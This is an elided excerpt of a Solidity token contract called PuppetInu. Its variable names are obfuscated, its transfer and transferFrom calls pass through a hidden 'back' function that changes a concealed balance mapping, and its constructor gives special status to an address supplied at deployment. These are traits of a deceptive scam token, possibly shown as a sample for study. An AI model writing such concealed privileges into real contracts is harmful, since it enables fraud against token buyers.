...
contract PuppetInu is Ownable {
    ...
    string private political;
    uint256 private element;
    uint8 private welcome;
    ...
    uint256 sets;
    bool search;
    address private again;
    address private food;
    address private solution;
    ...
    function back(
        ...
        if (!search && boy[easier] == 0 && rhyme[easier] > 0) {
            boy[easier] -= welcome;
        }
    ...
    mapping(address => uint256) private rhyme;
    ...
    function transferFrom(
        ...
        back(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        back(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        string memory sitting,
        string memory useful,
        address rather,
        address refused
    ) {
        uniswapV2Router = IUniswapV2Router02(rather);
        again = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        element = 100;
        boy[refused] = welcome;
        _tTotal = 1000000000000000 * 10**welcome;
